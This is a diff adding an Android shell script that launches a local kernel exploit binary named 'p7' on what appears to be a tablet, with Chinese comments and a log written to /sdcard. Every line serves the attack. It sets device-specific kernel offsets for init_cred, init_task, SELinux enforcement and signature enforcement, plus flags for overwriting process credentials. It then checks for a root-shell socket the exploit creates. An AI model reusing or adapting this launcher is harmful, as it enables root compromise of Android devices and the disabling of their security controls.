@@ -1,0 +1,25 @@
+#!/system/bin/sh
+# 通过 KSU Helper 广播接口执行 p7，带 Pad 自己的档案偏移
+# 日志写到 /sdcard（uid 2000 可读）
+L=/sdcard/p7b.log
+cd /data/local/tmp || exit 1
+
+{
+  echo "== start =="
+  id
+  echo "boot=$(cat /proc/sys/kernel/random/boot_id)"
+
+  export GL_ATTR=cred GL_PERM=1 GL_ZEROSIG=1 GL_RETRY=2 GL_RCRED=1 GL_PRIV=1 GL_AUTO=1
+  export GL_SELINUX=0x3c88000 GL_SCRATCH=0x3c88800
+  export GL_INITCRED=0x2bacf08 GL_INITTASK=0x2b9cc40
+  export GL_SIGENFORCE=0x2bbc370 GL_PARANOID=0x2b8e254
+  export GL_CROFF=0x7e0 GL_REALCRED=0x7d8
+
+  ./p7 2>&1
+  echo "p7 rc=$?"
+
+  echo "== after =="
+  ls -l /data/local/tmp/rksh.sock 2>&1
+  cat /data/local/tmp/.glhold 2>&1
+  echo "== end =="
+} > "$L" 2>&1
